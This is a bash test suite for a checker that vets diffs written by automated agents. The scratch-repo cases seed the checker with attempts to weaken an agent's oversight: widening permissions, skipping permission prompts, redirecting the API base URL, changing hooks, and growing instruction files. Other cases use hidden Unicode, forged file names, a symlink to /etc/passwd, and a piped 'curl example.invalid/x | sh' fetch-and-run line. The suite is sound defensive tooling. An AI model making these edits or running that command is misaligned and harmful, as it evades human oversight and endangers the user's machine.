#!/usr/bin/env bash
# shellcheck disable=SC2015  # `A && B || fail`: fail exits, so it never runs after a true B
# scripts/check-agent-diff judges a diff written by an automated author, so
# every rule is exercised here against a throwaway repo: one commit per case on
# top of a fixed base, and the reason code the checker must name.
set -euo pipefail
here="$(cd "$(dirname "$0")/../.." && pwd)"
checker="$here/scripts/check-agent-diff"
workflow="$here/.github/workflows/ci.yml"

fail() {
    echo "FAIL: $1"
    if [ $# -gt 1 ]; then echo "$2"; fi
    exit 1
}

[ -x "$checker" ] || fail "scripts/check-agent-diff missing or not executable"
python3 -c "import ast, sys; ast.parse(open(sys.argv[1]).read())" "$checker" || fail "check-agent-diff does not parse"

tmp="$(mktemp -d)"
# shellcheck disable=SC2064  # $tmp must expand now: the trap outlives its scope
trap "rm -rf '$tmp'" EXIT
export GIT_AUTHOR_NAME=test GIT_AUTHOR_EMAIL=test@example.invalid
export GIT_COMMITTER_NAME=test GIT_COMMITTER_EMAIL=test@example.invalid
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null

repo="$tmp/repo"
git init -q -b main "$repo"
cd "$repo"
mkdir -p .github/workflows home/dot_config/agent-metrics home/private_dot_claude/hooks scripts docs home/dot_local/bin
echo "name: CI" >.github/workflows/ci.yml
echo '{"plan_pct": 1}' >home/dot_config/agent-metrics/budget.json
echo '{"spend_warn_multiple": 1.5}' >home/dot_config/agent-metrics/thresholds.json
cat >home/dot_config/agent-metrics/propose.json <<'EOF'
{"protected_paths": ["docs/frozen/*"],
 "settings_source": "home/private_dot_claude/modify_settings.json.json.tmpl",
 "workflow_instruction_file": "home/AGENTS.md",
 "instruction_sources": {"~/.claude/CLAUDE.md": "home/private_dot_claude/CLAUDE.md"},
 "max_changed_lines": 6, "strict_finders": ["unattributed-sessions"]}
EOF
cp "$checker" scripts/check-agent-diff
printf 'one\ntwo\nthree\n' >home/private_dot_claude/CLAUDE.md
printf 'a\nb\n' >home/AGENTS.md
cat >home/private_dot_claude/modify_settings.json.json.tmpl <<'EOF'
#!/usr/bin/env bash
DEFAULTS='{
  "model": "opus",
  "env": {
    "MAX_MCP_OUTPUT_TOKENS": "50000"
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "rtk hook claude" }
        ]
      }
    ]
  }
}'
ENFORCED='{
  "deniedMcpServers": [
    { "serverName": "claude.ai Gmail" }
  ],
  "enabledPlugins": {
    "remember@claude-plugins-official": false
  }
}'
EOF
printf '#!/bin/sh\necho summary\n' >home/private_dot_claude/hooks/executable_session-summary.sh
printf '#!/usr/bin/env bash\necho hi\n' >scripts/tool.sh
printf '# Notes\n\nplain text\n' >docs/notes.md
mkdir -p docs/frozen && echo keep >docs/frozen/a.md
echo 'export EDITOR=vi' >home/dot_bashrc
git add -A
git commit -q -m "base"
base="$(git rev-parse HEAD)"

out="$tmp/out"
# check <want-exit> [checker args...]: runs against base..HEAD of the scratch repo.
check() {
    local want="$1" got=0
    shift
    python3 "$checker" "$@" "$base" HEAD >"$out" 2>&1 || got=$?
    [ "$got" = "$want" ] || fail "check-agent-diff $* exited $got, want $want" "$(cat "$out")"
}
# commit_case <subject>: commits whatever the case staged, on top of the base.
commit_case() {
    git add -A
    git commit -q -m "$1"
}
reset_case() {
    git reset -q --hard "$base"
    git clean -qfdx
}
# expect <reason> <path>: the last run named this reason for this file.
expect() {
    grep -qxF "FAIL $1 $2" "$out" || fail "expected 'FAIL $1 $2'" "$(cat "$out")"
}

# ── A clean edit passes ──
sed -i 's/plain text/plainer text/' docs/notes.md
commit_case "docs: tidy notes"
check 0
grep -q "^OK" "$out" || fail "a clean diff does not say OK" "$(cat "$out")"
reset_case

sed -i 's/"remember@claude-plugins-official": false/"remember@claude-plugins-official": false,\n    "caveman@caveman": false/' \
    home/private_dot_claude/modify_settings.json.json.tmpl
commit_case "chore(agent-audit): disable unused plugin caveman"
check 0
reset_case

# ── Protected paths ──
protected() {  # <path> <content>
    mkdir -p "$(dirname "$1")"
    printf '%s\n' "$2" >>"$1"
    commit_case "chore: touch $1"
    check 1
    expect protected_path "$1"
    reset_case
}
protected .github/workflows/ci.yml "x"
protected .github/rulesets/main.json "{}"
protected docs/rulesets/main.json "{}"
protected home/dot_config/agent-metrics/budget.json "x"
protected home/dot_config/agent-metrics/propose.json "x"
protected home/dot_config/agent-metrics/thresholds.json "x"
protected scripts/check-agent-diff "# x"
protected home/private_dot_ssh/id_ed25519 "x"
protected home/encrypted_private_token.age "x"
protected home/dot_config/app/server.pem "x"
protected home/dot_config/app/secrets.yaml "x"
protected .claude/settings.json "{}"
protected .mcp.json "{}"
protected .gitattributes "* -diff"
protected home/.chezmoiignore "x"
# A path protected only by the config at the base revision.
protected docs/frozen/a.md "x"

# Deleting a protected file is touching it.
git rm -q home/dot_config/agent-metrics/budget.json
commit_case "chore: drop budget"
check 1
expect protected_path home/dot_config/agent-metrics/budget.json
reset_case

# The permissions block of the settings source, and deny rules, are off limits.
sed -i 's/"model": "opus",/"model": "opus",\n  "permissions": { "allow": ["Bash(*)"] },/' home/private_dot_claude/modify_settings.json.json.tmpl
commit_case "chore: allow"
check 1
expect protected_settings_block home/private_dot_claude/modify_settings.json.json.tmpl
reset_case
sed -i 's/"model": "opus",/"model": "opus",\n  "skipDangerousModePermissionPrompt": true,/' home/private_dot_claude/modify_settings.json.json.tmpl
commit_case "chore: skip prompt"
check 1
expect protected_settings_block home/private_dot_claude/modify_settings.json.json.tmpl
reset_case

# ── Unicode ──
printf 'zero\xe2\x80\x8bwidth\n' >>docs/notes.md
commit_case "docs: zero width"
check 1
expect invisible_unicode docs/notes.md
reset_case
printf 'bidi \xe2\x80\xae override\n' >>docs/notes.md
commit_case "docs: bidi"
check 1
expect invisible_unicode docs/notes.md
reset_case
printf 'tag \xf3\xa0\x81\x81 char\n' >>docs/notes.md
commit_case "docs: tag"
check 1
expect invisible_unicode docs/notes.md
reset_case
# Visible non-ASCII is fine in prose, and refused where it would be executed or parsed.
printf 'caf\xc3\xa9\n' >>docs/notes.md
commit_case "docs: accent"
check 0
reset_case
printf 'echo caf\xc3\xa9\n' >>scripts/tool.sh
commit_case "chore: accent in shell"
check 1
expect non_ascii scripts/tool.sh
reset_case
printf '# caf\xc3\xa9\n' >>home/private_dot_claude/modify_settings.json.json.tmpl
commit_case "chore: accent in settings"
check 1
expect non_ascii home/private_dot_claude/modify_settings.json.json.tmpl
reset_case
printf 'alias x=\xd0\xb0\n' >>home/dot_bashrc
commit_case "chore: homoglyph in rc"
check 1
expect non_ascii home/dot_bashrc
reset_case
# Text already in the file is not the author's doing.
printf 'old caf\xc3\xa9\n' >>scripts/tool.sh
commit_case "chore: pre-existing"
pre="$(git rev-parse HEAD)"
echo 'echo more' >>scripts/tool.sh
commit_case "chore: add a line"
python3 "$checker" "$pre" HEAD >"$out" 2>&1 || fail "pre-existing non-ASCII was blamed on a later edit" "$(cat "$out")"
reset_case

# ── Instruction files may shrink or hold, never grow ──
printf 'four\n' >>home/private_dot_claude/CLAUDE.md
commit_case "docs: grow"
check 1
expect instruction_growth home/private_dot_claude/CLAUDE.md
reset_case
printf 'one\ntwo and a bit\nthree\n' >home/private_dot_claude/CLAUDE.md
commit_case "docs: grow bytes"
check 1
expect instruction_growth home/private_dot_claude/CLAUDE.md
reset_case
printf 'one\nTWO\nthree\n' >home/private_dot_claude/CLAUDE.md
commit_case "docs: same size"
check 0
reset_case
printf 'one\nthree\n' >home/private_dot_claude/CLAUDE.md
commit_case "docs: shrink"
check 0
reset_case
mkdir -p home/projects && echo "new" >home/projects/AGENTS.md
commit_case "docs: new instruction file"
check 1
expect instruction_growth home/projects/AGENTS.md
reset_case
# An import pulls another file into every session without growing this one.
printf 'one\n@b.md\nthree\n' >home/private_dot_claude/CLAUDE.md
commit_case "docs: import"
check 1
expect instruction_import home/private_dot_claude/CLAUDE.md
reset_case

# ── Hooks, API-redirecting environment and MCP need the strict marker ──
strict_case() {  # <reason> <path> <subject>
    commit_case "$3"
    check 1
    expect "$1" "$2"
    git commit -q --amend -m "$3 [!strict]"
    check 0
    grep -q "^STRICT" "$out" || fail "a strict pass does not say so" "$(cat "$out")"
    reset_case
}
settings=home/private_dot_claude/modify_settings.json.json.tmpl
sed -i 's/rtk hook claude/rtk hook claude --all/' "$settings"
strict_case hook_change "$settings" "chore: change hook command"
sed -i 's/"matcher": "Bash",/"matcher": "Edit",/' "$settings"
strict_case hook_change "$settings" "chore: change hook matcher"
echo 'echo more' >>home/private_dot_claude/hooks/executable_session-summary.sh
strict_case hook_change home/private_dot_claude/hooks/executable_session-summary.sh "chore: edit hook script"
sed -i 's/"MAX_MCP_OUTPUT_TOKENS": "50000"/"MAX_MCP_OUTPUT_TOKENS": "50000",\n    "ANTHROPIC_BASE_URL": "x"/' "$settings"
strict_case env_change "$settings" "chore: redirect api"
echo 'export HTTPS_PROXY=x' >>home/dot_bashrc
strict_case env_change home/dot_bashrc "chore: proxy"
echo 'export OPENAI_BASE_URL=x' >>home/dot_bashrc
strict_case env_change home/dot_bashrc "chore: base url"
sed -i 's/{ "serverName": "claude.ai Gmail" }/{ "serverName": "claude.ai Other" }/' "$settings"
strict_case mcp_change "$settings" "chore: mcp deny list"
echo 'claude mcp add x -- y' >>scripts/tool.sh
strict_case mcp_change scripts/tool.sh "chore: mcp add"
# The marker never unlocks a protected path.
echo x >>.github/workflows/ci.yml
commit_case "chore: workflow [!strict]"
check 1
expect protected_path .github/workflows/ci.yml
reset_case

# ── Modes, symlinks, binaries ──
chmod +x docs/notes.md
commit_case "chore: chmod"
check 1
expect mode_change docs/notes.md
reset_case
printf '#!/bin/sh\n' >scripts/new.sh && chmod +x scripts/new.sh
commit_case "chore: new executable"
check 1
expect mode_change scripts/new.sh
reset_case
ln -s /etc/passwd docs/link
commit_case "chore: symlink"
check 1
expect symlink docs/link
reset_case
printf 'a\0b\n' >docs/blob.bin
commit_case "chore: binary"
check 1
expect binary docs/blob.bin
reset_case
printf 'bad \xff\xfe utf8\n' >docs/bad.txt
commit_case "chore: invalid utf8"
check 1
expect binary docs/bad.txt
reset_case

# ── Output forms ──
printf 'l1\n' >>docs/notes.md
commit_case "docs: a line"
check 0 --json
python3 - "$out" <<'PY' || fail "--json output is wrong" "$(cat "$out")"
import json, sys
j = json.load(open(sys.argv[1]))
assert j == {"ok": True, "strict": False, "failures": []}, j
PY
reset_case
# A tree object stands in for the uncommitted edit, with the subject supplied.
sed -i 's/rtk hook claude/rtk hook claude --all/' "$settings"
git add -A
tree="$(git write-tree)"
got=0
python3 "$checker" --json --subject "chore: x" "$base" "$tree" >"$out" 2>&1 || got=$?
[ "$got" = 1 ] || fail "a tree with a hook change passed without the marker" "$(cat "$out")"
python3 - "$out" <<'PY' || fail "--json failure output is wrong" "$(cat "$out")"
import json, sys
j = json.load(open(sys.argv[1]))
assert j["ok"] is False and j["failures"] == [{"reason": "hook_change", "path": "home/private_dot_claude/modify_settings.json.json.tmpl"}], j
PY
python3 "$checker" --subject "chore: x [!strict]" "$base" "$tree" >"$out" 2>&1 || fail "a tree with the marker was refused" "$(cat "$out")"
reset_case
# A hostile file name is reported without its control characters.
printf 'x\n' >"docs/evil"$'\n'"FAIL none.md"
ln -s /etc/passwd "docs/l"$'\033'"[31m"
commit_case "chore: names"
check 1
[ "$(grep -c '^FAIL ' "$out")" = 1 ] || fail "a file name forged an extra result line" "$(cat "$out")"
grep -q $'\033' "$out" && fail "a control character from a file name reached the output"
reset_case
# Garbage revisions fail closed.
got=0
python3 "$checker" "$base" not-a-rev >"$out" 2>&1 || got=$?
[ "$got" = 2 ] || fail "an unknown revision exited $got, want 2" "$(cat "$out")"
got=0
python3 "$checker" >"$out" 2>&1 || got=$?
[ "$got" = 2 ] || fail "no arguments exited $got, want 2"
python3 "$checker" --help >"$out" 2>&1 || fail "--help failed"
# A policy file that cannot be read protects nothing by accident: it fails the run.
echo 'not json' >home/dot_config/agent-metrics/propose.json
commit_case "chore: break policy"
broken="$(git rev-parse HEAD)"
echo more >>docs/notes.md
commit_case "docs: after broken policy"
got=0
python3 "$checker" "$broken" HEAD >"$out" 2>&1 || got=$?
[ "$got" = 1 ] || fail "an unreadable policy did not fail the check" "$(cat "$out")"
grep -q "^FAIL policy_unreadable " "$out" || fail "an unreadable policy is not named" "$(cat "$out")"
reset_case

# ── Line terminators: only "\n" ends a line, and every other one is refused ──
# Each of these is a line break to Python's splitlines and not to git or bash,
# so a scan that splits on them never sees the character or what follows it.
python3 - "$tmp/terminators" <<'PY'
import sys
chars = {"cr": "\r", "vt": "\x0b", "ff": "\x0c", "fs": "\x1c", "gs": "\x1d", "rs": "\x1e", "nel": "\x85",
         "ls": " ", "ps": " "}
import os
os.makedirs(sys.argv[1])
for name, ch in chars.items():
    open(f"{sys.argv[1]}/{name}", "w", encoding="utf-8", newline="").write(ch)
PY
for t in "$tmp"/terminators/*; do
    name="$(basename "$t")"
    # An instruction file, same line count, fewer bytes.
    python3 - home/private_dot_claude/CLAUDE.md "$t" <<'PY'
import sys
ch = open(sys.argv[2], encoding="utf-8", newline="").read()
open(sys.argv[1], "w", encoding="utf-8", newline="").write(f"one\nt{ch}\nthree\n")
PY
    commit_case "docs: terminator $name in an instruction file"
    check 1
    expect invisible_unicode home/private_dot_claude/CLAUDE.md
    reset_case
    # The settings script: a valid plugin line, and an existing line break swapped for the character.
    python3 - "$settings" "$t" <<'PY'
import sys
ch = open(sys.argv[2], encoding="utf-8", newline="").read()
text = open(sys.argv[1], encoding="utf-8", newline="").read()
text = text.replace('"remember@claude-plugins-official": false', '"remember@claude-plugins-official": false,\n    "caveman@caveman": false')
text = text.replace("#!/usr/bin/env bash\nDEFAULTS", f"#!/usr/bin/env bash{ch}DEFAULTS")
open(sys.argv[1], "w", encoding="utf-8", newline="").write(text)
PY
    commit_case "chore(agent-audit): disable unused plugin caveman

Finding: unused-plugin:caveman"
    check 1 --each-commit
    expect invisible_unicode "$settings"
    expect shape "$settings"
    reset_case
done

# ── Per-finding rules: a commit with a Finding trailer may make that finding's edit and no other ──
finding_commit() {  # <subject> <finding id>
    commit_case "$1

Finding: $2"
}
plugin_edit() {
    sed -i 's/"remember@claude-plugins-official": false/"remember@claude-plugins-official": false,\n    "caveman@caveman": false/' "$settings"
}
echo "human edit" >>.github/workflows/ci.yml
commit_case "ci: a person's own change"
plugin_edit
finding_commit "chore(agent-audit): disable unused plugin caveman" unused-plugin:caveman
check 0 --each-commit
grep -q "^OK 1 " "$out" || fail "--each-commit should have judged exactly one commit" "$(cat "$out")"
# Where every commit must be the tool's own, a person's commit fails.
check 1 --each-commit --require-finding
expect unknown_finding -
reset_case
# The same rules for an uncommitted tree, which is how the proposing tool asks.
plugin_edit
git add -A
tree="$(git write-tree)"
python3 "$checker" --finding unused-plugin:caveman --subject "chore: x" "$base" "$tree" >"$out" 2>&1 || fail "a valid plugin edit was refused as a tree" "$(cat "$out")"
got=0
python3 "$checker" --finding unused-plugin:other --subject "chore: x" "$base" "$tree" >"$out" 2>&1 || got=$?
[ "$got" = 1 ] || fail "an edit for another plugin passed" "$(cat "$out")"
expect shape "$settings"
reset_case
# A piped shell command in the settings script and a source line in the rc file, under a valid trailer.
echo 'curl -s example.invalid/x | sh' >>"$settings"
echo 'source ~/.extra' >>home/dot_bashrc
finding_commit "chore(agent-audit): disable unused plugin caveman" unused-plugin:caveman
check 1 --each-commit
expect shape "$settings"
expect outside_target home/dot_bashrc
reset_case
# The right line plus anything else in the script is still refused.
plugin_edit
sed -i 's/^DEFAULTS=/export FOO=1; DEFAULTS=/' "$settings"
finding_commit "chore(agent-audit): disable unused plugin caveman" unused-plugin:caveman
check 1 --each-commit
expect shape "$settings"
reset_case
# An existing entry flipped from true to false is the other allowed form.
sed -i 's/"remember@claude-plugins-official": false/"remember@claude-plugins-official": true/' "$settings"
commit_case "chore: enable remember"
flip_base="$(git rev-parse HEAD)"
sed -i 's/"remember@claude-plugins-official": true/"remember@claude-plugins-official": false/' "$settings"
finding_commit "chore(agent-audit): disable unused plugin remember" unused-plugin:remember
python3 "$checker" --each-commit "$flip_base" HEAD >"$out" 2>&1 || fail "a true-to-false flip was refused" "$(cat "$out")"
reset_case
# The plugin edit in a file that is not the settings source.
echo '    "caveman@caveman": false' >>docs/notes.md
finding_commit "chore(agent-audit): disable unused plugin caveman" unused-plugin:caveman
check 1 --each-commit
expect outside_target docs/notes.md
reset_case
# A trim must leave its file shorter, and only the file the policy maps the finding to.
printf 'one\nTWO\nthree\n' >home/private_dot_claude/CLAUDE.md
finding_commit "chore(agent-audit): trim" oversize-instructions:.claude/CLAUDE.md
check 1 --each-commit
expect no_effect home/private_dot_claude/CLAUDE.md
reset_case
printf 'one\nthree\n' >home/private_dot_claude/CLAUDE.md
finding_commit "chore(agent-audit): trim" oversize-instructions:.claude/CLAUDE.md
check 0 --each-commit
reset_case
printf 'a\n' >home/AGENTS.md
finding_commit "chore(agent-audit): trim" oversize-instructions:.claude/CLAUDE.md
check 1 --each-commit
expect outside_target home/AGENTS.md
reset_case
printf 'a\n' >home/AGENTS.md
finding_commit "chore(agent-audit): trim" oversize-instructions:AGENTS.md
check 1 --each-commit
expect unknown_finding -
reset_case
printf 'a\nB\n' >home/AGENTS.md
finding_commit "chore(agent-audit): steer" unattributed-sessions:interactive
check 0 --each-commit
reset_case
# The line cap comes from the policy at the base: six here.
seq 1 20 >home/private_dot_claude/CLAUDE.md
git add -A && git commit -q -m "docs: long file"
long_base="$(git rev-parse HEAD)"
seq 1 12 >home/private_dot_claude/CLAUDE.md
finding_commit "chore(agent-audit): trim" oversize-instructions:.claude/CLAUDE.md
got=0
python3 "$checker" --each-commit "$long_base" HEAD >"$out" 2>&1 || got=$?
[ "$got" = 1 ] || fail "eight removed lines passed a cap of six" "$(cat "$out")"
expect too_large -
reset_case
# A finder nobody defined, a quota finding (never edited), and two trailers on one commit.
echo more >>docs/notes.md
finding_commit "chore(agent-audit): x" made-up:thing
check 1 --each-commit
expect unknown_finding -
reset_case
echo more >>docs/notes.md
finding_commit "chore(agent-audit): x" weekly-quota-peak:weekly
check 1 --each-commit
expect unknown_finding -
reset_case
plugin_edit
commit_case "chore(agent-audit): two

Finding: unused-plugin:caveman
Finding: unused-plugin:quiet"
check 1 --each-commit
expect unknown_finding -
reset_case
# A later clean commit does not hide an earlier bad one.
printf 'four\n' >>home/private_dot_claude/CLAUDE.md
finding_commit "chore(agent-audit): grow" oversize-instructions:.claude/CLAUDE.md
plugin_edit
finding_commit "chore(agent-audit): disable unused plugin caveman" unused-plugin:caveman
check 1 --each-commit
expect instruction_growth home/private_dot_claude/CLAUDE.md
reset_case
# The strict marker counts only for a finder the policy lists, on the commit that carries it.
sed -i 's/rtk hook claude/rtk hook claude --all/' "$settings"
finding_commit "chore(agent-audit): hook [!strict]" unused-plugin:caveman
check 1 --each-commit
expect hook_change "$settings"
reset_case
sed -i 's/"strict_finders": \["unattributed-sessions"\]/"strict_finders": ["unused-plugin"]/' home/dot_config/agent-metrics/propose.json
commit_case "chore: let the plugin finder make strict changes"
strict_base="$(git rev-parse HEAD)"
sed -i 's/rtk hook claude/rtk hook claude --all/' "$settings"
finding_commit "chore(agent-audit): hook" unused-plugin:caveman
got=0
python3 "$checker" --each-commit "$strict_base" HEAD >"$out" 2>&1 || got=$?
[ "$got" = 1 ] || fail "an unmarked hook change passed for a strict-allowed finder" "$(cat "$out")"
expect hook_change "$settings"
git commit -q --amend -m "chore(agent-audit): hook [!strict]

Finding: unused-plugin:caveman"
python3 "$checker" --each-commit "$strict_base" HEAD >"$out" 2>&1 || fail "a marked hook change was refused for a strict-allowed finder" "$(cat "$out")"
grep -q "^STRICT" "$out" || fail "a strict pass does not say so" "$(cat "$out")"
# Even then the one-file rule holds.
echo more >>docs/notes.md
git add -A && git commit -q --amend --no-edit
got=0
python3 "$checker" --each-commit "$strict_base" HEAD >"$out" 2>&1 || got=$?
[ "$got" = 1 ] || fail "a strict commit touched a second file" "$(cat "$out")"
expect outside_target docs/notes.md
reset_case
check 0 --each-commit
grep -q "^OK 0 " "$out" || fail "an empty range should judge nothing" "$(cat "$out")"
# With no policy at the base there are no per-finding rules to apply: fail closed.
git rm -q home/dot_config/agent-metrics/propose.json
commit_case "chore: no policy"
nopolicy="$(git rev-parse HEAD)"
plugin_edit
finding_commit "chore(agent-audit): disable unused plugin caveman" unused-plugin:caveman
got=0
python3 "$checker" --each-commit "$nopolicy" HEAD >"$out" 2>&1 || got=$?
[ "$got" = 1 ] || fail "a finding commit passed with no policy to judge it by" "$(cat "$out")"
grep -q "^FAIL policy_unreadable " "$out" || fail "a missing policy is not named" "$(cat "$out")"
reset_case

# ── CI wiring ──
cd "$here"
grep -q "scripts/check-agent-diff" "$workflow" || fail "ci.yml does not run the checker"
grep -q -- "--each-commit" "$workflow" || fail "ci.yml must judge each Finding commit on its own"
grep -q "fetch-depth: 0" "$workflow" || fail "the checker job needs full history to see the base"
grep -q "github.event_name == 'pull_request'" "$workflow" || fail "the checker job must run on pull requests only"
# Event fields reach the shell through the environment, never by interpolation into the script.
python3 - "$workflow" <<'PY' || fail "ci.yml interpolates an event field into a run script"
import re, sys
text = open(sys.argv[1]).read()
job = text[text.index("agent-diff:"):]
for block in re.findall(r"run: \|\n((?:\s{10,}.*\n)+)", job):
    assert "${{" not in block, block
PY

echo "test_check_agent_diff: OK"
